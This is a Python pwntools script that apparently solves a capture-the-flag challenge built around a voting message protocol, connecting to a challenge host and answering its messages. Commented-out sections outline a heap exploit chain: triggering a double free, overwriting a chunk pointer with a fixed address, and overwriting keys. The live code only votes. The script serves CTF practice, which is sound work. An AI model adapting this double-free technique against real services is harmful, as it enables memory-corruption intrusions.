#!/usr/bin/env python3

from asyncio.tasks import wait
import time
import sys
import os
from pwn import p32, p64, u32, u64, context, remote
from time import sleep
from construct import *
from ctypes import sizeof, c_int
import struct
import codecs
from hashlib import sha256
from binascii import hexlify

MESSAGE_HEADER_LEN = sizeof(c_int) + 32 + sizeof(c_int)
VOTER_BASE = p64(0x406180)

POSE_QUESTION     = 0
VOTER_VOTE        = 1
MSG_RESPONSE      = 2
VOTER_LOG_CACHE   = 3
VOTER_LOG_SAVE    = 4
VOTER_READY       = 5
INVALID_DIRECTIVE = 99

GenericMessageHeader = Struct(
    'directive' / Int32ul,
    'key'       / Bytes(32),
    'mlen'      / Int32ul
)

def create_msg(msg, d, key):
    msg_size = len(msg)  # directive, key, length of header+msg, msg
    full_msg_packed = struct.pack(f"<I32sI", d, key, msg_size) + msg

    print(f"Creating message with len {len(full_msg_packed)}: {hexlify(full_msg_packed)}")

    return full_msg_packed

def exploitChallenge(p, key):

    voted = False
    freed = False
    overwrite_ptr = False
    log_cached = False
    overwrite_key = False
    question = False
    waitfornewkey = False
    commit_vote = False

    while(True):
        msg = p.recvline().strip()

        if b"flag" in msg:
            print(msg)
            break

        if b"Okay where the heck are we going? Guys?" in msg:
            continue

        print(f"Msg Received: {msg}\n")

        msg = codecs.decode(msg, "hex")
        try:
            msgHeader = GenericMessageHeader.parse(msg[0:MESSAGE_HEADER_LEN])
        except StreamError as e:
            continue

        if msgHeader.directive == 0:
            question = True

        if msgHeader.directive == 1 and msgHeader.key == b"\xFF"*32:
            commit_vote = True

        if msgHeader.key == key:
            key = sha256(key).digest()
            print(f"Key is now: {key}")
            waitfornewkey = False
        elif waitfornewkey:
            print("Waiting for new key...\n")
            continue

        # if(not voted and question):
        #     print("First vote")
        #     voter_msg = create_msg(b"1"*8*4, VOTER_VOTE, key)
        #     p.sendline(hexlify(voter_msg))
        #     voted = True
        #     question = False
        #     waitfornewkey = True
        #     continue
        # elif(not voted):
        #     continue

        # if(voted and not freed):
        #     print("Causing doublefree")
        #     # Causes doublefree
        #     voter_msg = create_msg(b"", VOTER_READY, key)
        #     p.sendline(hexlify(voter_msg))
        #     freed = True
        #     continue

        # if(voted and freed and not overwrite_ptr and question):
        #     print("Overwriting pointer in chunk")
        #     voter_msg = create_msg(VOTER_BASE, VOTER_VOTE, key)
        #     p.sendline(hexlify(voter_msg))
            
        #     overwrite_ptr = True
        #     waitfornewkey = True
        #     continue
            
        # if(voted and freed and overwrite_ptr and not log_cached):
        #     print("Caching a log...")
        #     voter_msg = create_msg(b"A"*8*4, VOTER_LOG_CACHE, key)
        #     p.sendline(hexlify(voter_msg))

        #     log_cached = True
        #     continue
    
        # if(voted and freed and overwrite_ptr and log_cached and not overwrite_key):
        #     print("Overwriting keys...")
        #     voter_msg = create_msg(b"A"*8*4, VOTER_LOG_CACHE, key)
        #     p.sendline(hexlify(voter_msg))

        #     overwrite_key = True
        
        if(question):
            print("Voting normally...")
            time.sleep(1.5)
            voter_msg = create_msg(b"\00"*8*4, VOTER_VOTE, key)
            question = False
            waitfornewkey = True
            commit_vote = False
            p.sendline(hexlify(voter_msg))

    return

if __name__ == "__main__":
    if len(sys.argv) > 1:
        p = open(sys.argv[1], 'wb')
    else: 
        p = remote(os.getenv("CHAL_HOST", "172.17.0.1"), os.getenv("CHAL_PORT", "31337"))
        # get ticket from environment
        # ticket = os.getenv("TICKET")

        # # pass ticket to ticket-taker
        # if ticket:
        #     prompt = p1.recv(128)  # "Ticket please:"
        #     p1.send((ticket + "\n").encode("utf-8"))
        #     print("Sent Ticket")
    
        # service_host, service_port = p1.read().rstrip().split(b':')[1:]
        # sleep(1)
        # p = remote(service_host, service_port)
        
    banner = p.recvline()
    key = p.recvline()

    print(key)
    key = key.strip().split(b" ")[-1]

    print(key)
    exploitChallenge(p, key)
